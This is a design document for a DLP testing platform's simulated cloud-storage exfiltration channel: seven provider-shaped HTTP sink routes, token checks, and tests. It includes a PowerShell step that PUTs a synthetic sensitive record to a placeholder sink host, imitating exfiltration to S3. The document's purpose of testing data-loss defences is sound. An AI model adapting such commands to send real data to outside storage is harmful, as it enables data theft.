# Cloud Storage Exfiltration Channel — Design

## Problem

Fifth sub-project of the DLP exfiltration maturity program, following HTTPS, DNS
tunneling, SFTP, and SMTP (see their specs in this same directory). A third-party
DLP exfiltration benchmark report (`data_exfiltration_csv_report.csv`, analyzed
2026-09-01, not built by Audspect) shows real test coverage across 6 distinct
cloud-storage providers with meaningful row weight — One Drive (265 rows),
Google Drive (265), Dropbox (29), AWS S3 (298), Azure Blob (298), Google Storage
(298) — none of which this platform currently tests. Cloud storage is a
genuinely different exfiltration surface from every channel built so far: real
enterprise DLP/CASB products spend significant effort specifically recognizing
cloud-provider API traffic shapes, and this platform currently has zero coverage
for that recognition capability.

Cloud storage is architecturally novel compared to every prior channel in one
specific way: HTTPS, DNS, SFTP, and SMTP all point a **real** client tool or
protocol implementation at this platform's own on-prem sink — the wire protocol
itself is genuine, only the destination is fake. Cloud storage cannot follow
that pattern at all: a real AWS S3 / Azure Blob / Google Drive / Dropbox /
Google Storage / OneDrive / Box API call requires a real cloud account and
would leave the network entirely, which breaks this program's hard safety rule
(the destination is always this same on-prem deployment, no external server is
ever contacted). This design resolves that tension directly (see Decisions).

## Decisions

Confirmed during brainstorming:

- **Seven providers in V1, not a subset.** AWS S3, Azure Blob, OneDrive, Google
  Drive, Dropbox, Google Storage, and Box. The first six close the exact gap the
  third-party benchmark CSV identified; Box was added on top as a common
  enterprise cloud-storage/DLP-test target the benchmark happens not to cover.
  All seven ship together in this one sub-project — no phased provider rollout.
- **One shared MITRE technique: T1567.002 — Exfiltration to Cloud Storage.**
  Confirmed against this repo's own bundled ATT&CK enrichment data
  (`orchestrator/internal/reporting/attackdata/attack_enrichment.json`); no
  provider-specific sub-techniques exist in ATT&CK for this behavior, so all
  seven scenario steps share this one `technique_id`.
- **New routes on the existing HTTPS API server (`:9443`), not a new
  listener/port.** Unlike SFTP/SMTP/DNS — each a genuinely distinct non-HTTP
  wire protocol needing its own TCP/UDP bind — all seven cloud providers are
  HTTPS REST APIs. There is no structural reason to open a second port for
  "more HTTPS traffic to the same server." This also means no new
  `SINK_CLOUD_ENABLED`-style config flag, no new docker-compose port mapping,
  and no new install.sh port-collision analysis — the existing server's own
  enable/disable posture already covers it. The handler code itself is plain
  `net/http`/chi and is inherently TLS-agnostic: it never knows or cares
  whether TLS terminates directly on this server or via a reverse proxy in
  front of it, so nothing about this design needs to change if the deployment
  story around `:9443`'s TLS termination changes later.
- **Fidelity bar: match the externally observable HTTP request shape, not
  cryptographic authenticity.** Ordered by what actually helps a DLP/CASB
  product's traffic recognition, from most to least valuable: (1) destination
  host identity, (2) URL/path structure, (3) HTTP method, (4) vendor-specific
  headers, (5) content/body structure, (6) MIME/content-type, (7)
  authentication/signing. V1 targets (2)–(6) as faithfully as practical and
  **deliberately omits (7)** — no SigV4, no Azure SAS/shared-key signing, no
  OAuth. Hand-rolling per-vendor cryptographic signing (canonical request
  construction, HMAC chains, etc.) is real, non-trivial engineering effort for
  a capability most content-inspection DLP products don't actually check
  (they inspect payload content and traffic shape, not whether the
  Authorization header would pass real vendor auth). (1), destination host
  identity, is structurally unavailable without DNS/SNI host-spoofing — see
  Out of scope.
- **Naming honesty:** every provider's simulation is internally named and
  labeled as "S3-compatible traffic simulation," "Graph-API-shaped traffic
  simulation," etc. — never "AWS traffic" or "real OneDrive traffic." Without
  real signing, it is not an authenticated request against the real vendor;
  scenario names, step names, and code comments say so explicitly.
- **Path-prefix tradeoff, stated explicitly:** because all seven providers
  share one host:port (the destination host cannot be spoofed to look like
  `s3.amazonaws.com` etc. without DNS/SNI tricks — out of scope), each route
  needs a short, honest provider-distinguishing prefix (`/cloudsink/{provider}/...`)
  before the real vendor's own path structure resumes. This is the one place
  V1's fidelity is bounded by the shared-host constraint every prior channel
  already lives with (SFTP's destination isn't a real-looking SFTP server
  hostname either) — named here because cloud storage's benchmark emphasizes
  host/path recognition specifically, so the limitation is worth being explicit
  about rather than silently accepted.
- **Token correlation: filename/object-key embedded, per provider's natural
  shape — reusing the existing 32-byte/64-hex `{{SINK_TOKEN}}` unchanged.**
  Same reasoning as SFTP: no DNS-style label-length constraint applies to an
  HTTP path segment or JSON field, so no new token byte-length variant is
  needed anywhere in this channel.
- **Each handler validates the token against `dlp_sink_tokens` before writing
  a receipt — same as SMTP, not the "accept anything" pattern HTTP/SFTP use.**
  Seven open, unauthenticated HTTP endpoints accepting literally any request
  body is a meaningfully larger accidental-scanning-noise surface than one
  SMTP listener or one narrow-shaped SFTP filename check; requiring an exact
  token match before persisting anything keeps `dlp_sink_receipts` clean the
  same way SMTP's Subject-match requirement does.
- **No AUTH / access-control checking on any of the seven routes** — same
  "testing content/protocol inspection, not access control" philosophy every
  prior channel follows.

## Design

### 1. Package structure

New package `internal/cloudsink`, mirroring `internal/sftpsink`/`internal/smtpsink`'s
isolation — its own file(s), its own tests, never merged into `internal/api`'s
existing HTTP sink handler. Since all seven providers share one HTTP transport
(unlike SFTP/SMTP/DNS's genuinely separate listeners), `internal/cloudsink`
exposes one `chi.Router` (or seven individual `http.HandlerFunc`s) that
`internal/api/routes.go` mounts under `/cloudsink/...`, rather than a
`StartListener`/`Serve` pair — there is no separate listener lifecycle to
manage here, only routes on the server that already exists.

```go
// internal/cloudsink/router.go
func Routes(db *pgxpool.Pool) chi.Router {
    r := chi.NewRouter()
    r.Put("/s3/{bucket}/{key}", handleS3Put(db))
    r.Put("/azureblob/{container}/{blob}", handleAzureBlobPut(db))
    r.Put("/graph/v1.0/me/drive/root:/{filename}:/content", handleOneDrivePut(db))
    r.Post("/gdrive/upload/drive/v3/files", handleGDriveUpload(db))
    r.Post("/dropbox/2/files/upload", handleDropboxUpload(db))
    r.Post("/gcs/upload/storage/v1/b/{bucket}/o", handleGCSUpload(db))
    r.Post("/box/2.0/files/content", handleBoxUpload(db))
    return r
}
```

`routes.go` mounts this under the existing router, unauthenticated (matching
`/api/dlp/sink`'s existing public-route precedent — see `routes.go`'s
`publicRoutes` grouping):

```go
router.Mount("/cloudsink", cloudsink.Routes(pool))
```

### 2. Per-provider route shapes

Each handler validates method + rough vendor-shaped header presence, extracts
the token from wherever that provider naturally carries a filename/object key,
bounds the read to `MaxUploadBytes` (64KB, matching every prior channel), and
on token match writes a receipt.

| Provider | Method + Path | Token location | Vendor-shape headers mimicked |
|---|---|---|---|
| AWS S3 | `PUT /cloudsink/s3/{bucket}/{key}` | `{key}` path segment | `x-amz-content-sha256`, `x-amz-date` |
| Azure Blob | `PUT /cloudsink/azureblob/{container}/{blob}` | `{blob}` path segment | `x-ms-version`, `x-ms-blob-type: BlockBlob` |
| OneDrive | `PUT /cloudsink/graph/v1.0/me/drive/root:/{filename}:/content` | `{filename}` path segment | `Content-Type` per Graph upload convention |
| Google Drive | `POST /cloudsink/gdrive/upload/drive/v3/files` | multipart JSON metadata part's `name` field | `Content-Type: multipart/related; boundary=...` |
| Dropbox | `POST /cloudsink/dropbox/2/files/upload` | `Dropbox-API-Arg` header's JSON `path` field | `Dropbox-API-Arg`, `Content-Type: application/octet-stream` |
| Google Storage | `POST /cloudsink/gcs/upload/storage/v1/b/{bucket}/o` | `name` query parameter | `Content-Type` per GCS media-upload convention |
| Box | `POST /cloudsink/box/2.0/files/content` | multipart `attributes` JSON part's `name` field | `Content-Type: multipart/form-data; boundary=...` |

Bucket/container names (`{bucket}`, `{container}`) are fixed synthetic literals
baked into each scenario step's command (e.g. `bas-sim-bucket`) — not
placeholders, not secrets, matching SFTP's fixed `dlptest@` username and SMTP's
fixed `dlptest@sink.audspect.local` address precedent.

### 3. Token generation and placeholder substitution

`issueSinkTokensAndSubstitute` (`internal/api/dlp_sink.go`) gains one new
placeholder branch for `{{SINK_CLOUD_HOST}}`/`{{SINK_CLOUD_PORT}}`, structured
exactly like the SFTP/SMTP blocks it sits beside — triggered independently,
substituting only the two placeholders it's responsible for, relying on the
existing unconditional `{{SINK_TOKEN}}` block to issue/substitute the token
itself whenever a step's command contains it (every real cloud-storage step's
command does, embedded in its provider-specific path/header/body):

```go
if strings.Contains(steps[i].Command, "{{SINK_CLOUD_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_CLOUD_PORT}}") {
    steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_CLOUD_HOST}}", cloudSinkHost(publicBaseURL))
    steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_CLOUD_PORT}}", cloudSinkPort())
}
```

`cloudSinkHost` mirrors `sftpSinkHost`/`smtpSinkHost`'s shape exactly: an
optional `SINK_CLOUD_HOST` environment override, otherwise the same
`dnsServerHost()` derivation every channel's host placeholder already uses.

`cloudSinkPort` is different from `sftpSinkPort`/`smtpSinkPort` in one
deliberate way: those two default to a *configured* value because SFTP/SMTP
each bind their own independent, independently-configurable port. Cloud
storage reuses the main API server's own port — there is no independent bind
to configure — so defaulting to a hardcoded value (e.g. the container-internal
`HTTP_PORT`) would be wrong whenever the externally-reachable port differs
from the internal one (a reverse proxy mapping 443 → 9443, for instance).
Instead `cloudSinkPort` extracts the port directly from `publicBaseURL` (the
same URL every request to reach this orchestrator already uses), falling back
to `SINK_CLOUD_PORT` only as an explicit override for the rare case where the
cloud-storage routes are deliberately reachable on a different externally-
published port than the rest of the API:

```go
func cloudSinkPort(publicBaseURL string) string {
	if v := os.Getenv("SINK_CLOUD_PORT"); v != "" {
		return v
	}
	if u, err := url.Parse(publicBaseURL); err == nil && u.Port() != "" {
		return u.Port()
	}
	return "443" // publicBaseURL has no explicit port -- assume default HTTPS
}
```

### 4. Receipt persistence

Each handler, on a token match, hashes the request body (SHA-256, raw content
never persisted — same rule every prior channel follows) and writes one
`dlp_sink_receipts` row with a provider-distinct `channel` value:
`cloud-s3`, `cloud-azureblob`, `cloud-onedrive`, `cloud-gdrive`,
`cloud-dropbox`, `cloud-gcs`, `cloud-box`. Same insert shape every prior
channel's receipt-writing code already uses:

```go
_, err = db.Exec(ctx,
    `INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
     VALUES ($1, $2, $3, $4, $5)`,
    token, sourceIP, hex.EncodeToString(sum[:]), len(body), "cloud-s3",
)
```

Because `dlp_sink_receipts` and its consumers (`internal/verifysync.annotateSinkReceipts`,
`internal/reporting.dlpVerifier`) already only check "does at least one receipt
exist for this token," **no changes are needed to either** — sink-primary
verdict resolution applies to all seven cloud-storage channels automatically
once the handlers write into the same table, exactly as established for every
prior channel.

### 5. Security hardening

Same bar as every prior channel, adapted for seven stateless HTTP endpoints:

- Bounded per-upload byte ceiling (`MaxUploadBytes = 64KB`), enforced via
  `http.MaxBytesReader` on the request body before any buffering.
- A coarse per-source-IP rate limit shared across all seven routes (one
  `rateLimiter` instance for the whole `internal/cloudsink` package, not one
  per provider — these are seven doors into the same abuse surface, not seven
  independent ones).
- Token validated against `dlp_sink_tokens` (exact match) before any receipt
  write — an unmatched token still returns a plausible success-shaped response
  (matching each real vendor's typical success status code) so the transaction
  never looks scary to whatever sent it, same "never leak what got matched"
  principle the HTTP sink's `DLPSink` handler already establishes.
- Logging never includes request/response body content — only the token (once
  matched), size, and hash.
- No filesystem writes, no external network calls of any kind — every handler
  is pure in-memory request handling plus one DB write.

### 6. V1 scenario content

New scenario `scenarios/dlp-exfiltration-cloud-storage.yaml`, seven steps (one
per provider), all `technique_id: T1567.002`. Each step:

1. Writes the same synthetic `[BAS-SIM-DLP]` multi-type record every prior
   channel uses, as the request body (or the relevant multipart/JSON field for
   providers that wrap the payload).
2. Issues the provider-shaped request via `Invoke-RestMethod`/`Invoke-WebRequest`
   directly — no tool-presence check needed, matching SMTP's reasoning
   (`Invoke-RestMethod` is a built-in PowerShell cmdlet on every supported
   Windows PowerShell/PowerShell 7+ install, same "always there" category).
3. Captures the command's own success/failure as `DLP_OBSERVATION:` secondary
   evidence only — never the graded verdict, per every prior channel's
   established pattern.

Example step (AWS S3; the other six follow the same shape with their own
path/header conventions from the table in Design §2):

```yaml
  - name: "DLP Validation — S3-Compatible Traffic Simulation (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic multi-type sensitive record to the platform's own S3-compatible-shaped endpoint (this same on-prem orchestrator). No real AWS account, no real S3 bucket, no external destination -- this is a traffic-shape simulation only, not an authenticated S3 request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: S3-shaped HTTPS PUT (path structure, x-amz-* headers) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $csvContent `
          -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: s3_put_result=success"
        Write-Output "EXEC T1567.002: S3-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      } catch {
        Write-Output "DLP_OBSERVATION: s3_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: S3-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the cloud-storage sink
      # actually received a request with a matching token, resolved
      # server-side by internal/cloudsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""
```

New detection-profile entry (`dlp-cloud-storage-block`) added to
`scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, following the
same `outcome_family: dlp`, `expected_outcome: Block` shape every existing
entry already uses — one entry covers all seven steps since they share one
`technique_id`.

## Testing

- Go unit tests in `internal/cloudsink`, one per provider handler: token
  extraction from the provider's specific location (path segment / header
  JSON field / query param / multipart field), correct `dlp_sink_receipts`
  row written only on a matched token (with the right `channel` value),
  correct no-op (still a plausible success response, no receipt) on an
  unmatched token, correct `MaxUploadBytes` rejection.
- `internal/api/dlp_sink_test.go`: the new `{{SINK_CLOUD_HOST}}`/`{{SINK_CLOUD_PORT}}`
  placeholder substitution, confirming the existing 32-byte token path is
  reused unchanged, and a dedicated regression test proving exactly one
  `dlp_sink_tokens` row exists per run+technique (the orphaned-second-token
  bug class caught during SFTP's implementation, guarded against here from
  the start, same as SMTP).
- Regression confirmation: full `internal/verifysync` and `internal/reporting`
  suites re-run to prove neither needs any change.
- Integration-style tests: for each provider, dispatch a step-shaped request
  against a real `httptest.Server` wrapping `cloudsink.Routes`, confirm a
  `dlp_sink_receipts` row lands with the correct channel/hash/size, and
  confirm `dlpVerifier` resolves `Succeeded` from it exactly as it would for
  every other channel.

## Out of scope

- Real cryptographic request signing (AWS SigV4, Azure Shared Key/SAS, OAuth
  bearer tokens for Google/Dropbox/Box/Graph) — V1 is traffic-shape simulation
  only, per the Decisions section's fidelity-bar tradeoff. A future
  sub-project could add real signing if a specific customer/DLP evaluation
  proves the content-inspection-only bar this channel ships with is
  insufficient — not scheduled, not assumed needed.
- DNS/SNI host-spoofing to make the destination host itself resolve to
  something that looks like `s3.amazonaws.com`/`graph.microsoft.com`/etc. —
  every request's real destination is honestly this on-prem orchestrator, at
  its own address, matching every prior channel's identical constraint.
- Resumable/chunked upload flows (S3 multipart upload, Google's resumable
  upload session, OneDrive's large-file upload session) — V1 covers only the
  single-request upload shape each provider supports for small files, which
  is also the shape a 64KB synthetic record actually needs.
- ICMP tunneling, webhook-style channels (Slack/MS Teams/GitHub/GitLab),
  telnet — next in priority order per the DLP exfiltration channel roadmap,
  each its own sub-project.
- A dashboard/UI surface for per-provider cloud-storage sink health — there is
  no separate listener lifecycle to surface status for (these are routes on
  the always-up main API server), matching the reasoning that led every prior
  channel's `Status()` type to only ever report the state of its own
  independent listener.
